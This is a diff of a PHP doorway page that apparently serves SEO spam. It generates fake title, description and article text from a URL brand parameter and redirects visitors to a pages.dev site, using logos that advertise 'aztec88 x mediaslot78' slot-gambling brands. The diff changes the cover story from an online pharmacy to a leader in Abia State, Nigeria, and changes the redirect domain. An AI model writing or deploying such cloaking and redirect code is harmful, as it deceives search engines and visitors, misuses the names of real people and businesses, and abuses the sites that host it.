@@ -62,14 +62,14 @@ if (isset($_GET['ID_id'])) {
     $current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
     // SEO DATA (AUTO GENERATE)
-    $title = "$BRAND x $BRAND2 - Solusi Apotek Digital untuk Kebutuhan Obat dan Produk Kesehatan Modern";
+    $title = "$BRAND x $BRAND2 - Mendorong Kepemimpinan Transparan dan Perubahan Positif";
 
-    $description = "$BRAND x $BRAND2 menyediakan layanan apotek digital dengan akses mudah ke obat, produk kesehatan, dan kebutuhan farmasi melalui sistem online yang praktis dan aman.";
+    $description = "$BRAND x $BRAND2 menghadirkan informasi tentang kepemimpinan, pelayanan publik, transparansi pemerintahan, kegiatan sosial, dan kontribusi pembangunan masyarakat di Abia State.";
     
-    $artikel = "$BRAND x $BRAND2 hadir sebagai platform kesehatan digital yang membantu pengguna memperoleh kebutuhan farmasi melalui layanan online. Dengan konsep apotek modern, platform ini mendukung kemudahan akses terhadap produk kesehatan sekaligus memberikan pengalaman belanja yang lebih efisien.";
+    $artikel = "$BRAND x $BRAND2 merupakan tokoh yang aktif dalam bidang pelayanan publik dan kepemimpinan di Abia State, Nigeria. Melalui berbagai aktivitas pemerintahan, sosial, dan komunitas, ia berkomitmen terhadap nilai transparansi, efisiensi, inovasi, serta pembangunan masyarakat yang berkelanjutan.";
 
     // Bisa diganti random image atau CDN sendiri
-    $image = "https://i.pinimg.com/1200x/54/7d/b1/547db14b4a104f5e5d5a180f74888cf4.jpg";  
+    $image = "https://i.pinimg.com/1200x/09/a4/bb/09a4bbed1206ca47fc96853e8fca9390.jpg";  
 
     // Canonical URL
     $canonical = $current_url;
@@ -79,7 +79,7 @@ if (isset($_GET['ID_id'])) {
 }
 
 // Redirect target
-$ampmek = "https://faholospharmacy.pages.dev/?ID_id=$BRAND";
+$ampmek = "https://oluebubechukwu.pages.dev/?ID_id=$BRAND";
 $logo = "https://www.residentviews.com/assets/logo/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 $favicon = "https://www.residentviews.com/assets/icon/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 ?>
